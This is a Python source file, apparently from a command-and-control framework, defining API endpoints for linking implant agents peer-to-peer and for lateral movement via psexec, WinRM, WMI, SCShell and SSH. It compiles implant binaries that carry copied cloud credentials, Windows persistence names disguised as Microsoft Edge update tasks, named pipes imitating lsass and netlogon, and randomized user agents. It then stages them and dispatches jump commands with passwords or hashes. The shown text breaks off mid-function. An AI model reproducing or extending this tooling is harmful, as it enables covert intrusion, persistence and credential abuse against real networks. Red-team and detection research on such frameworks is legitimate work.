"""
server/routers/p2p.py — /api/v1/p2p endpoints.

GET    /api/v1/p2p/topology              — full topology graph (nodes + edges)
POST   /api/v1/sessions/{id}/link        — establish P2P parent→child link
DELETE /api/v1/sessions/{id}/link/{child} — remove a P2P link
POST   /api/v1/sessions/{id}/p2p/status  — request P2P status from agent
POST   /api/v1/sessions/{id}/p2p/link-tcp      — send p2p_link_tcp command
POST   /api/v1/sessions/{id}/p2p/link-smb      — send p2p_link_smb command
POST   /api/v1/sessions/{id}/p2p/unlink        — send p2p_unlink command
POST   /api/v1/sessions/{id}/p2p/listener/start — start P2P listener on agent
POST   /api/v1/sessions/{id}/p2p/listener/stop  — stop P2P listener on agent
POST   /api/v1/sessions/{id}/jump        — lateral movement via jump module
POST   /api/v1/sessions/{id}/kill-cascade  — kill session and all P2P descendants
POST   /api/v1/p2p/generate-listener          — build standalone P2P listener beacon
GET    /api/v1/p2p/listener/{session_id}/download — download generated P2P beacon binary
"""

from __future__ import annotations

import asyncio
import base64
import json
import logging
import os
import re as _re
import secrets
import shutil
import subprocess
import threading
from pathlib import Path
from typing import Optional

from fastapi import APIRouter, Depends, HTTPException, Request, status
from core import tz as _tz

from server.models import (
    CascadeKillResponse,
    CommandResponse,
    JumpRequest,
    JumpStatus,
    LinkRequest,
    P2PListenerGenRequest,
    P2PListenerGenResponse,
    TopologyEdge,
    TopologyNode,
    TopologyResponse,
    UnlinkRequest,
    _session_summary,
)
from server.routers.auth import get_current_user
from server.session import ServerSessionManager

router = APIRouter(tags=["p2p"])


def _sm(request: Request) -> ServerSessionManager:
    return request.app.state.sm


def _require_session(sm, session_id):
    s = sm.get(session_id)
    if not s:
        raise HTTPException(status_code=404, detail="Session not found")
    return s


async def _send(request, session_id, command, username, display=None):
    sm = _sm(request)
    ok, conflict, cmd_id = await sm.send_command(session_id, command, username, display=display)
    if not ok:
        return CommandResponse(
            ok=False,
            error="Command in flight — another operator holds the lock",
            locked_by=conflict.issued_by if conflict else None,
            locked_cmd_id=conflict.cmd_id if conflict else None,
        )
    ts = _tz.now().isoformat()
    await request.app.state.ws.broadcast({
        "type": "session.command",
        "ts": ts,
        "payload": {
            "session_id": session_id,
            "cmd_id": cmd_id,
            "command": display or command,
            "operator": username,
            "ts": ts,
        },
    })
    return CommandResponse(ok=True, cmd_id=cmd_id)


def _is_admin(privs: str) -> bool:
    if not privs:
        return False
    p = privs.lower().strip()
    return p in ("admin", "root", "system", "nt authority\\system", "elevated") or "*" in p


def _parse_port(address: str) -> Optional[int]:
    m = _re.search(r':(\d+)$', address)
    return int(m.group(1)) if m else None


def _link_status(child, child_snap: dict) -> str:
    """Derive link status from child heartbeat timing.

    up       — child checked in within 3× its sleep interval
    degraded — child silent for 3×–6× sleep (possible transient issue)
    down     — child silent for >6× sleep or state is dead/offline
    """
    state = child_snap.get("state", "unknown")
    if state in ("dead", "offline"):
        return "down"
    if state == "unknown" or not child:
        return "down"
    last_hb = child_snap.get("last_hb_ts") or child_snap.get("last_seen_at")
    if not last_hb:
        return "down"
    from datetime import datetime, timezone
    try:
        if isinstance(last_hb, str):
            last_hb = last_hb.replace("Z", "+00:00")
            ts = datetime.fromisoformat(last_hb)
        else:
            ts = last_hb
        if ts.tzinfo is None:
            ts = ts.replace(tzinfo=timezone.utc)
        age_s = (datetime.now(timezone.utc) - ts).total_seconds()
    except Exception:
        return "down"
    sleep_s = getattr(child, 'agent_sleep', None)
    if sleep_s is None or sleep_s <= 0:
        sleep_s = getattr(child.profile, 'base_sleep', 30) or 30
    if age_s <= sleep_s * 3:
        return "up"
    if age_s <= sleep_s * 6:
        return "degraded"
    return "down"


# ── topology ─────────────────────────────────────────────────────────────────

@router.get("/api/v1/p2p/topology", response_model=TopologyResponse)
def get_topology(request: Request, username: str = Depends(get_current_user)):
    sm = _sm(request)
    nodes: list[TopologyNode] = []
    edges: list[TopologyEdge] = []
    sessions = sm.all()

    for s in sessions:
        snap = s.state.snapshot()
        profile = s.profile
        is_internal = getattr(profile, 'p2p_is_internal', False)
        nodes.append(TopologyNode(
            guid=s.id,
            label=profile.label or "",
            hostname=snap.get("target_host", ""),
            ip=snap.get("target_ip", ""),
            ext_ip=snap.get("target_ip_ext", ""),
            os=snap.get("target_os", ""),
            username=snap.get("target_user", ""),
            domain=snap.get("target_domain", ""),
            pid=snap.get("agent_pid", ""),
            process=snap.get("agent_process", ""),
            is_admin=_is_admin(snap.get("target_privs", "")),
            is_egress=not is_internal,
            link_type=getattr(profile, 'p2p_link_type', '') or ("cloud" if not is_internal else ""),
            status=snap.get("state", "unknown"),
            last_seen=snap.get("last_hb_ts", ""),
            provider=profile.provider,
            folder_path=profile.folder_path,
            input_file=profile.input_file,
            output_file=profile.output_file,
            heartbeat_file=profile.heartbeat_file,
        ))

        children_str = getattr(profile, 'p2p_children_guids', '')
        if children_str:
            for child_id in children_str.split(","):
                child_id = child_id.strip()
                if not child_id:
                    continue
                child = sm.get(child_id)
                child_link_type = ""
                child_link_addr = ""
                if child:
                    child_link_type = getattr(child.profile, 'p2p_link_type', '')
                    child_link_addr = getattr(child.profile, 'p2p_link_address', '')
                child_snap = child.state.snapshot() if child else {}
                edges.append(TopologyEdge(
                    source=s.id,
                    target=child_id,
                    link_type=child_link_type,
                    link_port=_parse_port(child_link_addr),
                    link_address=child_link_addr,
                    status=_link_status(child, child_snap),
                ))

    return TopologyResponse(nodes=nodes, edges=edges)


# ── link management (server-side topology bookkeeping) ────────────────────────

@router.post("/api/v1/sessions/{session_id}/link", status_code=status.HTTP_200_OK)
async def create_link(session_id: str, body: LinkRequest, request: Request,
                      username: str = Depends(get_current_user)):
    """Register a P2P parent→child link in the server's topology model."""
    sm = _sm(request)
    parent = _require_session(sm, session_id)
    child = _require_session(sm, body.child_session_id)

    if getattr(child.profile, 'p2p_parent_guid', '') and child.profile.p2p_parent_guid != session_id:
        raise HTTPException(
            status_code=409,
            detail=f"Child already has parent: {child.profile.p2p_parent_guid}",
        )

    child.profile.p2p_parent_guid = session_id
    child.profile.p2p_link_type = body.link_type
    child.profile.p2p_link_address = body.link_address
    child.profile.p2p_is_internal = True

    children = set(
        c.strip()
        for c in getattr(parent.profile, 'p2p_children_guids', '').split(",")
        if c.strip()
    )
    children.add(body.child_session_id)
    parent.profile.p2p_children_guids = ",".join(sorted(children))

    sm.save_session(session_id)
    sm.save_session(body.child_session_id)

    ts = _tz.now().isoformat()
    await request.app.state.ws.broadcast({
        "type": "p2p.link_established",
        "ts": ts,
        "payload": {
            "parent_id": session_id,
            "child_id": body.child_session_id,
            "link_type": body.link_type,
            "link_address": body.link_address,
            "operator": username,
        },
    })
    await request.app.state.ws.broadcast({
        "type": "topology_changed",
        "ts": ts,
        "payload": {"action": "link_added", "parent_id": session_id, "child_id": body.child_session_id},
    })

    return {
        "ok": True,
        "parent_id": session_id,
        "child_id": body.child_session_id,
        "link_type": body.link_type,
    }


@router.delete("/api/v1/sessions/{session_id}/link/{child_id}", status_code=status.HTTP_200_OK)
async def remove_link(session_id: str, child_id: str, request: Request,
                      username: str = Depends(get_current_user)):
    """Remove a P2P parent→child link from the server's topology model."""
    sm = _sm(request)
    parent = _require_session(sm, session_id)
    child = sm.get(child_id)

    children = set(
        c.strip()
        for c in getattr(parent.profile, 'p2p_children_guids', '').split(",")
        if c.strip()
    )
    children.discard(child_id)
    parent.profile.p2p_children_guids = ",".join(sorted(children))
    sm.save_session(session_id)

    if child:
        child.profile.p2p_parent_guid = ""
        child.profile.p2p_link_type = ""
        child.profile.p2p_link_address = ""
        sm.save_session(child_id)

    ts = _tz.now().isoformat()
    await request.app.state.ws.broadcast({
        "type": "p2p.link_lost",
        "ts": ts,
        "payload": {
            "parent_id": session_id,
            "child_id": child_id,
            "operator": username,
        },
    })
    await request.app.state.ws.broadcast({
        "type": "topology_changed",
        "ts": ts,
        "payload": {"action": "link_removed", "parent_id": session_id, "child_id": child_id},
    })

    return {"ok": True, "parent_id": session_id, "child_id": child_id}


# ── P2P agent commands (forwarded to agent via dead-drop) ─────────────────────

@router.post("/api/v1/sessions/{session_id}/p2p/status", response_model=CommandResponse)
async def p2p_status(session_id: str, request: Request,
                     username: str = Depends(get_current_user)):
    _require_session(_sm(request), session_id)
    return await _send(request, session_id, "P2P_STATUS", username, display="/p2p status")


class _LinkTcpRequest(LinkRequest):
    pass

from pydantic import BaseModel as _BM

class P2PLinkTcpRequest(_BM):
    address: str

class P2PLinkSmbRequest(_BM):
    target: str
    pipe_name: str = ""

class P2PUnlinkRequest(_BM):
    guid: str

class P2PListenerStartRequest(_BM):
    address: str

class P2PListenerStopRequest(_BM):
    address: str = ""


@router.post("/api/v1/sessions/{session_id}/p2p/link-tcp", response_model=CommandResponse)
async def p2p_link_tcp(session_id: str, body: P2PLinkTcpRequest, request: Request,
                       username: str = Depends(get_current_user)):
    _require_session(_sm(request), session_id)
    return await _send(request, session_id, f"P2P_LINK_TCP:{body.address}", username,
                       display=f"/p2p link tcp {body.address}")


@router.post("/api/v1/sessions/{session_id}/p2p/link-smb", response_model=CommandResponse)
async def p2p_link_smb(session_id: str, body: P2PLinkSmbRequest, request: Request,
                       username: str = Depends(get_current_user)):
    _require_session(_sm(request), session_id)
    pipe = f":{body.pipe_name}" if body.pipe_name else ""
    return await _send(request, session_id, f"P2P_LINK_SMB:{body.target}{pipe}", username,
                       display=f"/p2p link smb {body.target} {body.pipe_name}".strip())


@router.post("/api/v1/sessions/{session_id}/p2p/unlink", response_model=CommandResponse)
async def p2p_unlink(session_id: str, body: P2PUnlinkRequest, request: Request,
                     username: str = Depends(get_current_user)):
    _require_session(_sm(request), session_id)
    return await _send(request, session_id, f"P2P_UNLINK:{body.guid}", username,
                       display=f"/p2p unlink {body.guid}")


@router.post("/api/v1/sessions/{session_id}/p2p/listener/start", response_model=CommandResponse)
async def p2p_listener_start(session_id: str, body: P2PListenerStartRequest, request: Request,
                             username: str = Depends(get_current_user)):
    _require_session(_sm(request), session_id)
    return await _send(request, session_id, f"P2P_LISTENER_START_TCP:{body.address}", username,
                       display=f"/p2p listener start tcp {body.address}")


@router.post("/api/v1/sessions/{session_id}/p2p/listener/stop", response_model=CommandResponse)
async def p2p_listener_stop(session_id: str, body: P2PListenerStopRequest, request: Request,
                            username: str = Depends(get_current_user)):
    _require_session(_sm(request), session_id)
    if body.address:
        return await _send(request, session_id, f"P2P_LISTENER_STOP:{body.address}", username,
                           display=f"/p2p listener stop {body.address}")
    return await _send(request, session_id, "P2P_LISTENER_STOP_ALL", username,
                       display="/p2p listener stop all")


# ── Jump (lateral movement) ─────────────────────────────────────────────────

_log = logging.getLogger(__name__)

_VALID_JUMP_MODULES = frozenset({"psexec", "psexec_psh", "winrm", "wmi", "scshell", "ssh"})
_LINUX_MODULES      = frozenset({"ssh"})

_jump_lock = threading.Lock()
_jump_tasks: dict[str, dict] = {}


def _load_parent_creds(project_dir: Path, creds_file: str) -> dict:
    """Load transport credentials from a session's creds file."""
    path = project_dir / creds_file
    if not path.exists():
        return {}
    creds: dict = {}
    for line in path.read_text().splitlines():
        m = _re.match(r'^(\w+)=["\']?(.*?)["\']?\s*$', line.strip())
        if m:
            creds[m.group(1)] = m.group(2).strip()
    return creds


def _provider_env(provider: str, creds: dict) -> dict:
    """Map provider creds to STRATUM_* build env vars."""
    env = {"STRATUM_PROVIDER": provider}
    if provider == "s3":
        env.update({
            "STRATUM_ACCESS_KEY_ID":     creds.get("ACCESS_KEY_ID", ""),
            "STRATUM_SECRET_ACCESS_KEY": creds.get("SECRET_ACCESS_KEY", ""),
            "STRATUM_S3_REGION":         creds.get("REGION", ""),
            "STRATUM_S3_BUCKET":         creds.get("BUCKET", ""),
        })
    elif provider == "onedrive":
        env.update({
            "STRATUM_APP_KEY":       creds.get("APP_KEY", ""),
            "STRATUM_APP_SECRET":    creds.get("APP_SECRET", ""),
            "STRATUM_TENANT_ID":     creds.get("TENANT_ID", ""),
            "STRATUM_REFRESH_TOKEN": creds.get("REFRESH_TOKEN", ""),
        })
    elif provider == "sharepoint":
        env.update({
            "STRATUM_APP_KEY":       creds.get("APP_KEY", ""),
            "STRATUM_APP_SECRET":    creds.get("APP_SECRET", ""),
            "STRATUM_TENANT_ID":     creds.get("TENANT_ID", ""),
            "STRATUM_REFRESH_TOKEN": creds.get("REFRESH_TOKEN", ""),
            "STRATUM_SITE_ID":       creds.get("SITE_ID", ""),
        })
    elif provider == "googledrive":
        env.update({
            "STRATUM_APP_KEY":       creds.get("APP_KEY", ""),
            "STRATUM_APP_SECRET":    creds.get("APP_SECRET", ""),
            "STRATUM_REFRESH_TOKEN": creds.get("REFRESH_TOKEN", ""),
            "STRATUM_FOLDER_ID":     creds.get("FOLDER_ID", ""),
        })
    else:
        env.update({
            "STRATUM_APP_KEY":       creds.get("APP_KEY", ""),
            "STRATUM_APP_SECRET":    creds.get("APP_SECRET", ""),
            "STRATUM_REFRESH_TOKEN": creds.get("REFRESH_TOKEN", ""),
        })
    return env


def _build_p2p_agent(
    parent_profile,
    project_dir: Path,
    child_session_id: str,
    p2p_guid: str,
    bind_addr: str,
    bind_type: str,
    target_platform: str,
    key_password: Optional[bytes] = None,
) -> tuple[Optional[Path], Optional[str], dict]:
    """Build a P2P child agent binary. Returns (binary_path, error_string, child_files)."""
    from cryptography.hazmat.primitives.asymmetric import rsa as _rsa_mod
    from cryptography.hazmat.primitives.serialization import (
        Encoding as _Enc, NoEncryption as _NoEnc, PrivateFormat as _PF, PublicFormat as _PuF,
        BestAvailableEncryption as _BAE,
    )
    from providers._epoch import generate_prekey_pool

    native_dir = Path("agents/native/rust")
    if not native_dir.exists():
        return None, "agents/native/rust not found", {}
    if not shutil.which("cargo"):
        cargo_bin = Path.home() / ".cargo" / "bin"
        if (cargo_bin / "cargo").exists():
            os.environ["PATH"] = str(cargo_bin) + os.pathsep + os.environ.get("PATH", "")
        else:
            return None, "cargo not found", {}

    # Generate child crypto material
    priv_key = _rsa_mod.generate_private_key(public_exponent=65537, key_size=4096)
    enc = _BAE(key_password) if key_password else _NoEnc()
    priv_pem = priv_key.private_bytes(_Enc.PEM, _PF.TraditionalOpenSSL, enc)
    pub_pem = priv_key.public_key().public_bytes(_Enc.PEM, _PuF.SubjectPublicKeyInfo)
    session_key = secrets.token_bytes(32).hex()
    pool = generate_prekey_pool(8)
    prekey_privs_hex = b"".join(priv for priv, _ in pool).hex()
    prekey_pubs_hex  = b"".join(pub for _, pub in pool).hex()

    # Persist identity for the child
    tag = secrets.token_hex(4)
    win_tag = secrets.token_hex(4)

    # Save child keys
    deploy_base = Path("deployments")
    deploy_base.mkdir(exist_ok=True)
    child_keys_dir = deploy_base / f"_jump_{child_session_id}" / "keys" / child_session_id
    child_keys_dir.mkdir(parents=True, exist_ok=True)
    (child_keys_dir / "private_key.pem").write_bytes(priv_pem)
    (child_keys_dir / "public_key.pem").write_bytes(pub_pem)
    (child_keys_dir / "private_key.pem").chmod(0o600)
    (child_keys_dir / "session_key.hex").write_text(session_key)
    (child_keys_dir / "session_key.hex").chmod(0o600)

    # Copy parent creds file for the child session
    parent_creds_path = project_dir / parent_profile.creds_file
    child_deploy_dir = deploy_base / f"_jump_{child_session_id}"
    child_creds_dst = child_deploy_dir / f".{parent_profile.provider}_refresh_token"
    if parent_creds_path.exists():
        shutil.copy2(parent_creds_path, child_creds_dst)
        child_creds_dst.chmod(0o600)

    donor_label = getattr(parent_profile, 'label', '') or parent_profile.folder_path
    (child_deploy_dir / "DEPLOYMENT_GUIDE.txt").write_text(
        f"Session ID: {child_session_id}\n"
        f"Generated: {_tz.now().isoformat()}\n"
        f"Provider: {parent_profile.provider}\n"
        f"Mode: P2P Listener\n"
        f"Label: {donor_label} (P2P {bind_type.upper()})\n"
        f"Folder: {parent_profile.folder_path}\n"
        f"Bind: {bind_type}:{bind_addr}\n"
        f"Donor: {parent_profile.session_id}\n"
    )

    # Load parent transport creds
    creds = _load_parent_creds(project_dir, parent_profile.creds_file)

    # Resolve STUN IP
    import socket as _sock
    stun_ip = "stun.l.google.com"
    for host in ("stun.l.google.com", "stun1.l.google.com"):
        try:
            infos = _sock.getaddrinfo(host, 19302, _sock.AF_INET, _sock.SOCK_DGRAM)
            if infos:
                stun_ip = infos[0][4][0]
                break
        except Exception:
            pass

    # UA pool
    _UA_POOL = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    ]

    _child_input  = f"/{secrets.token_hex(4)}"
    _child_output = f"/{secrets.token_hex(4)}"
    _child_hb     = f"/{secrets.token_hex(4)}"

    # Build environment
    build_env = {
        **os.environ,
        "PATH": os.environ.get("PATH", ""),
        "CC_x86_64_unknown_linux_musl": "musl-gcc",
        # P2P mode
        "STRATUM_P2P_MODE":       "true",
        "STRATUM_P2P_BIND_ADDR":  bind_addr,
        "STRATUM_P2P_BIND_TYPE":  bind_type,
        "STRATUM_P2P_GUID":       p2p_guid,
        # Deploy mode — stageless-plain for the child
        "STRATUM_DEPLOY_MODE":    "stageless-plain",
        # Transport config (baked but unused by P2P child)
        **_provider_env(parent_profile.provider, creds),
        # Timing
        "STRATUM_WINDOW_START":    parent_profile.window_start or "",
        "STRATUM_WINDOW_END":      parent_profile.window_end   or "",
        "STRATUM_KILL_DATE":       parent_profile.kill_date     or "",
        # Cloud channel — unique per child to avoid collisions with parent
        "STRATUM_FOLDER_PATH":    parent_profile.folder_path,
        "STRATUM_INPUT_FILE":     _child_input,
        "STRATUM_OUTPUT_FILE":    _child_output,
        "STRATUM_HEARTBEAT_FILE": _child_hb,
        "STRATUM_BASE_SLEEP":     str(parent_profile.base_sleep),
        "STRATUM_JITTER":         str(parent_profile.jitter_percent),
        # Child's own crypto
        "STRATUM_PUBLIC_KEY_B64": base64.b64encode(pub_pem).decode(),
        "STRATUM_STUN_IP":        stun_ip,
        "STRATUM_SESSION_KEY":    session_key,
        "STRATUM_PREKEY_POOL_B64": base64.b64encode(bytes.fromhex(prekey_pubs_hex)).decode(),
        # Blob paths
        "STRATUM_BLOB_PATH_LINUX": parent_profile.blob_path or "",
        "STRATUM_BLOB_PATH_WIN":   parent_profile.blob_path_win or "",
        # Persist identity (unique per child)
        "STRATUM_PERSIST_SUFFIX":  f".local/share/{tag}",
        "STRATUM_PERSIST_PAYLOAD": f".{secrets.token_hex(3)}",
        "STRATUM_PERSIST_SVC":     tag,
        "STRATUM_CRON_COMMENT":    f"# {tag}-update",
        "STRATUM_RC_COMMENT":      f"# {tag}-rc",
        "STRATUM_TASK_NAME":       f"MicrosoftEdgeUpdateTask{win_tag}",
        "STRATUM_REG_VALUE":       f"MicrosoftEdgeHelper{win_tag}",
        # UA + staging prefix (unique per child)
        "STRATUM_UA":              _UA_POOL[secrets.randbelow(len(_UA_POOL))],
        "STRATUM_STAGING_PREFIX":  secrets.token_hex(4),
        # Debug
        "STRATUM_DEBUG":           "false",
    }

    # MSVC cross-compilation env (for Windows targets)
    xwin_dir = None
    for candidate in [
        Path(os.environ.get("XWIN_DIR", "")) if os.environ.get("XWIN_DIR") else None,
        Path.home() / ".xwin",
        Path(f"/home/{os.environ.get('SUDO_USER', '')}/.xwin") if os.environ.get("SUDO_USER") else None,
    ]:
        if candidate and candidate.is_dir() and (candidate / "crt").is_dir():
            xwin_dir = candidate
            break

    # Force recompile of stratum-agent-rs
    target_root = native_dir / "target"
    host_build = target_root / "release" / "build"
    if host_build.exists():
        for d in host_build.glob("stratum-agent-rs-*"):
            shutil.rmtree(d, ignore_errors=True)
    for triple in ["x86_64-pc-windows-msvc", "x86_64-pc-windows-gnu",
                    "x86_64-unknown-linux-musl", "x86_64-unknown-none"]:
        for sub in ("release/build", "release/.fingerprint"):
            d_root = target_root / triple / sub
            if d_root.exists():
                for d in d_root.glob("stratum-agent-rs-*"):
                    shutil.rmtree(d, ignore_errors=True)
                if sub == "release/.fingerprint":
                    for d in d_root.glob("agent-*"):
                        shutil.rmtree(d, ignore_errors=True)

    # Build the agent for the target platform
    is_windows = target_platform == "windows"
    if is_windows:
        if not xwin_dir:
            return None, "Windows cross-compilation requires clang-cl + lld-link + xwin SDK", {}
        _xd = str(xwin_dir)
        msvc_env = {
            "CARGO_TARGET_X86_64_PC_WINDOWS_MSVC_LINKER": "lld-link",
            "CC_x86_64_pc_windows_msvc":  "clang-cl",
            "CXX_x86_64_pc_windows_msvc": "clang-cl",
            "AR_x86_64_pc_windows_msvc":  "llvm-lib",
            "RUSTFLAGS": (
                f"-Lnative={_xd}/crt/lib/x86_64 "
                f"-Lnative={_xd}/sdk/lib/um/x86_64 "
                f"-Lnative={_xd}/sdk/lib/ucrt/x86_64"
            ),
            "CFLAGS_x86_64_pc_windows_msvc": (
                f"-Wno-unused-command-line-argument -fuse-ld=lld-link "
                f"/imsvc{_xd}/crt/include "
                f"/imsvc{_xd}/sdk/include/ucrt "
                f"/imsvc{_xd}/sdk/include/um "
                f"/imsvc{_xd}/sdk/include/shared"
            ),
            "RC": "llvm-rc",
        }
        build_env.update(msvc_env)
        extra_args = ["--target", "x86_64-pc-windows-msvc"]
        triple = "x86_64-pc-windows-msvc"
        out_name = "agent.exe"
    else:
        extra_args = ["--target", "x86_64-unknown-linux-musl"]
        triple = "x86_64-unknown-linux-musl"
        out_name = "agent"

    _log.info("jump: building P2P child agent for %s (bind=%s:%s)", triple, bind_type, bind_addr)

    try:
        r = subprocess.run(
            ["cargo", "build", "--release"] + extra_args,
            cwd=native_dir, env=build_env,
            capture_output=True, text=True, timeout=600,
        )
    except subprocess.TimeoutExpired:
        return None, "Cargo build timed out (600s)", {}
    except Exception as e:
        return None, f"Cargo build error: {e}", {}

    if r.returncode != 0:
        err_tail = (r.stderr or "")[-500:]
        _log.error("jump: cargo build failed:\n%s", err_tail)
        return None, f"Cargo build failed: {err_tail}", {}

    artifact = native_dir / "target" / triple / "release" / out_name
    if not artifact.exists():
        return None, f"Build output not found: {artifact}", {}

    # Copy to child deploy dir
    dest = child_deploy_dir / "agent" / out_name
    dest.parent.mkdir(parents=True, exist_ok=True)
    shutil.copy2(artifact, dest)

    _log.info("jump: P2P child agent built: %s (%d bytes)", dest, dest.stat().st_size)

    return dest, None, {
        "input_file": _child_input,
        "output_file": _child_output,
        "heartbeat_file": _child_hb,
    }


@router.post("/api/v1/sessions/{session_id}/jump", response_model=JumpStatus,
             status_code=status.HTTP_202_ACCEPTED)
async def jump(session_id: str, body: JumpRequest, request: Request,
               username: str = Depends(get_current_user)):
    """Lateral movement: build P2P child agent, stage on parent's cloud, dispatch JUMP command."""
    if body.module not in _VALID_JUMP_MODULES:
        raise HTTPException(status_code=400, detail=f"Invalid module '{body.module}'. "
                            f"Valid: {sorted(_VALID_JUMP_MODULES)}")

    sm = _sm(request)
    parent = _require_session(sm, session_id)
    parent_snap = parent.state.snapshot()

    if parent_snap.get("state") not in ("online", "idle"):
        raise HTTPException(status_code=409, detail="Parent session is not online")

    # Determine target platform
    if body.platform:
        target_platform = body.platform.lower()
    elif body.module in _LINUX_MODULES:
        target_platform = "linux"
    else:
        target_platform = "windows"

    # Determine link type
    link_type = body.link_type or ("smb" if target_platform == "windows" else "tcp")

    # Generate child identifiers
    child_session_id = os.urandom(6).hex()
    p2p_guid = os.urandom(16).hex()

    # Determine bind address
    if body.port > 0:
        bind_port = body.port
    else:
        bind_port = 4444 + secrets.randbelow(1000)

    if link_type == "smb":
        _PIPE_PREFIXES = ["msrpc_", "lsass_", "spoolss_", "wkssvc_", "srvsvc_", "netlogon_"]
        pipe_name = body.pipe or f"{_PIPE_PREFIXES[secrets.randbelow(len(_PIPE_PREFIXES))]}{secrets.token_hex(4)}"
        bind_addr = f"\\\\.\\pipe\\{pipe_name}"
    else:
        bind_addr = f"0.0.0.0:{bind_port}"

    # Get project dir
    project_dir = sm._sm.project_dir
    key_password = sm._sm._key_password

    # Check for concurrent jump builds
    if not _jump_lock.acquire(blocking=False):
        raise HTTPException(status_code=409, detail="Another jump build is in progress")
    _jump_lock.release()

    ts = _tz.now().isoformat()
    ws = request.app.state.ws
    loop = asyncio.get_running_loop()

    # Broadcast jump_started
    await ws.broadcast({
        "type": "jump_started",
        "ts": ts,
        "payload": {
            "parent_id": session_id,
            "child_session_id": child_session_id,
            "module": body.module,
            "target": body.target,
            "operator": username,
        },
    })

    def _run_jump():
        _jump_lock.acquire()
        try:
            # Build the P2P child agent
            binary_path, build_err, child_files = _build_p2p_agent(
                parent_profile=parent.profile,
                project_dir=project_dir,
                child_session_id=child_session_id,
                p2p_guid=p2p_guid,
                bind_addr=bind_addr,
                bind_type=link_type,
                target_platform=target_platform,
                key_password=key_password,
            )
            if build_err:
                _log.error("jump: build failed for %s → %s: %s",
                           session_id, body.target, build_err)
                async def _notify_fail():
                    await ws.broadcast({
                        "type": "jump_failed",
                        "ts": _tz.now().isoformat(),
                        "payload": {
                            "parent_id": session_id,
                            "child_session_id": child_session_id,
                            "module": body.module,
                            "target": body.target,
                            "error": build_err,
                            "operator": username,
                        },
                    })
                asyncio.run_coroutine_threadsafe(_notify_fail(), loop)
                return

            # Stage the binary on the parent's cloud channel
            binary_data = binary_path.read_bytes()
            staging_name = f"p2p_{child_session_id}_{binary_path.name}"
            staging_path = parent.profile.staging_path + "/" + staging_name

            try:
                parent.transport.upload(staging_path, binary_data)
                _log.info("jump: staged %s (%d bytes) at %s",
                          staging_name, len(binary_data), staging_path)
            except Exception as e:
                _log.error("jump: staging failed: %s", e)
                async def _notify_fail():
                    await ws.broadcast({
                        "type": "jump_failed",
                        "ts": _tz.now().isoformat(),
                        "payload": {
                            "parent_id": session_id,
                            "child_session_id": child_session_id,
                            "module": body.module,
                            "target": body.target,
                            "error": f"Staging failed: {e}",
                            "operator": username,
                        },
                    })
                asyncio.run_coroutine_threadsafe(_notify_fail(), loop)
                return

            # Build jump command params for the agent
            jump_params = {
                "module": body.module,
                "target": body.target,
                "user": body.user,
                "password": body.password,
                "hash": body.hash,
                "key_path": body.key_path,
                "link_type": link_type,
                "bind_addr": bind_addr,
                "staging_path": staging_path,
                "child_session_id": child_session_id,
                "p2p_guid": p2p_guid,
                "service": body.service or "XblAuthManager",
            }

            # Send JUMP command to parent agent
            jump_cmd = f"JUMP:{json.dumps(jump_params)}"

            async def _send_jump():
                ok, conflict, cmd_id = await sm.send_command(
                    session_id, jump_cmd, username,
                    display=f"/jump {body.module} {body.target}",
                )
                if not ok:
                    await ws.broadcast({
                        "type": "jump_failed",
                        "ts": _tz.now().isoformat(),
                        "payload": {
                            "parent_id": session_id,
                            "child_session_id": child_session_id,
                            "module": body.module,
                            "target": body.target,
                            "error": "Parent has a command in flight",
                            "operator": username,
                        },
                    })
                    return

                await ws.broadcast({
                    "type": "session.command",
                    "ts": _tz.now().isoformat(),
                    "payload": {
                        "session_id": session_id,
                        "cmd_id": cmd_id,
                        "command": f"/jump {body.module} {body.target}",
                        "operator": username,
                    },
                })

            asyncio.run_coroutine_threadsafe(_send_jump(), loop).result(timeout=30)

            # Register child session in the session manager
            _register_child_session(
                sm=sm,
                parent=parent,
                child_session_id=child_session_id,
                p2p_guid=p2p_guid,
                link_type=link_type,
                bind_addr=bind_addr,
                project_dir=project_dir,
                key_password=key_password,
                loop=loop,
                ws=ws,
                username=username,
                child_files=child_files,
            )

        except Exception as e:
            _log.exception("jump: unexpected error")
            async def _notify_fail():
                await ws.broadcast({
                    "type": "jump_failed",
                    "ts": _tz.now().isoformat(),
                    "payload": {
                        "parent_id": session_id,
                        "child_session_id": child_session_id,
                        "module": body.module,
                        "target": body.target,
                        "error": str(e),
                        "operator": username,
                    },
                })
            asyncio.run_coroutine_threadsafe(_notify_fail(), loop)
        finally:
            _jump_lock.release()

    threading.Thread(target=_run_jump, daemon=True, name=f"jump-{child_session_id}").start()

    return JumpStatus(
        ok=True,
        child_session_id=child_session_id,
        module=body.module,
        target=body.target,
    )


def _register_child_session(
    sm: ServerSessionManager,
    parent,
    child_session_id: str,
    p2p_guid: str,
    link_type: str,
    bind_addr: str,
    project_dir: Path,
    key_password: Optional[bytes],
    loop,
    ws,
    username: str,
    label: str = "",
    child_files: dict | None = None,
):
    """Register the P2P child as a session so it appears in the operator UI."""
    from providers._session import SessionProfile, Session, _load_creds_file, TRANSPORT_REGISTRY

    deploy_dir = Path("deployments") / f"_jump_{child_session_id}"
    creds_file = str(deploy_dir / f".{parent.profile.provider}_refresh_token")
    key_file   = str(deploy_dir / "keys" / child_session_id / "private_key.pem")

    sk_file = deploy_dir / "keys" / child_session_id / "session_key.hex"
    session_key = sk_file.read_text().strip() if sk_file.exists() else ""

    cf = child_files or {}

    profile = SessionProfile(
        session_id       = child_session_id,
        label            = label or f"⇢ {parent.profile.label} (P2P)",
        provider         = parent.profile.provider,
        creds_file       = creds_file,
        private_key_file = key_file,
        folder_path      = parent.profile.folder_path,
        input_file       = cf.get("input_file", f"/{secrets.token_hex(4)}"),
        output_file      = cf.get("output_file", f"/{secrets.token_hex(4)}"),
        heartbeat_file   = cf.get("heartbeat_file", f"/{secrets.token_hex(4)}"),
        base_sleep       = parent.profile.base_sleep,
        jitter_percent   = parent.profile.jitter_percent,
